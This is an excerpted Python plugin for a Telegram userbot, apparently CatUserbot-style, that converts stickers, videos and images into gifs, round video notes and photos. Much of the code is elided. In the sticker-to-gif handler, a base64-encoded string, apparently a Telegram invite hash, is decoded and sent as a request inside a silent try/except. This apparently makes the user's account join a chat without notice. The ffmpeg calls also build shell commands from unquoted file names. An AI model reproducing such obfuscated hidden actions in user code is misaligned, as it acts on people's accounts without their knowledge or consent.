...
from ..helpers.utils import _codtools, _codutils, _format, parse_pre, reply_id
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    media_type(reply)
    codevent = await edit_or_reply(event, "__Making round spin video wait a sec.....__")
    output = await _codtools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
    ...
    if output is None:
        return await edit_delete(codevent, "__Unable to make spin gif.__")
...
async def video_catfile(event):  # sourcery no-metrics
    ...
    flag = True
    codevent = await edit_or_reply(event, "`Converting to round format..........`")
    codfile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not codfile.endswith((".webp")):
            if codfile.endswith((".tgs")):
                hmm = await make_gif(codevent, codfile)
                os.rename(hmm, "./temp/circle.mp4")
                codfile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(codfile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
            ...
            if aspect_ratio != 1:
                crop_by = width if (height > width) else height
                await _codutils.runcmd(
                    f'ffmpeg -i {codfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(codfile, PATH)
            if str(codfile) != str(PATH):
                os.remove(codfile)
            try:
                codthumb = await reply.download_media(thumb=-1)
            except Exception as e:
        ...
        try:
            ...
            codthumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(codfile, codthumb)
        if codthumb is not None and not os.path.exists(codthumb):
            codthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, codthumb)
        if (
            codthumb is not None
            and not os.path.exists(codthumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            codthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, codthumb)
        if codthumb is not None and os.path.exists(codthumb):
            await _codutils.runcmd(
                f"""ffmpeg -loop 1 -i {codthumb} -i {codfile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(codfile)
        else:
            os.remove(codfile)
            return await edit_delete(
                codevent, "`No thumb found to make it video note`", 5
            )
    if (
        mediatype
        in [
        ...
        if os.path.exists(PATH):
            ...
            uploaded = await event.client.fast_upload_file(
                ...
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, codevent, c_time, "Uploading....")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
...
async def on_file_to_photo(event):
    ...
    codt = await edit_or_reply(event, "`Converting.....`")
...
async def _(event):  # sourcery no-metrics
    ...
    if not input_str:
        ...
        if len(loc) == 1:
            if 0 < loc[0] < 721:
                ...
                return await edit_delete(event, "Use quality of range 0 to 721")
    codreply = await event.get_reply_message()
    cod_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not codreply or not codreply.media or not codreply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if codreply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    ...
    try:
        cod_event = Get(cod_event)
        await event.client(cod_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    codfile = await event.client.download_media(codreply)
    codgif = await make_gif(event, codfile, quality, fps)
    xedoc = await event.client.send_file(
        event.chat_id,
        codgif,
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    codevent = await edit_or_reply(event, "__🎞 Making Gif from the relied media...__")
    imag = await _codtools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
    ...
    try:
        ...
        return await edit_delete(codevent, f"**Error**\n__{str(e)}__")
    output = io.BytesIO()
    output.name = "Output.gif"
    ...
    if output is None:
        await edit_delete(
            codevent, "__There was some error in the media. I can't format it to gif.__"
        )
        for i in [final, "Output.gif", imag[1]]:
            if os.path.exists(i):
                os.remove(i)
        return
    xedoc = await event.client.send_file(event.chat_id, output, reply_to=reply)
    await _codutils.unsavegif(event, xedoc)
    await codevent.delete()
    for i in [final, "Output.gif", imag[1]]:
        if os.path.exists(i):
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    codevent = await edit_or_reply(event, "__🎞Converting into Gif..__")
    ...
    xedoc = await event.client.send_file(event.chat_id, result, reply_to=reply)
    await _codutils.unsavegif(event, xedoc)
    await codevent.delete()
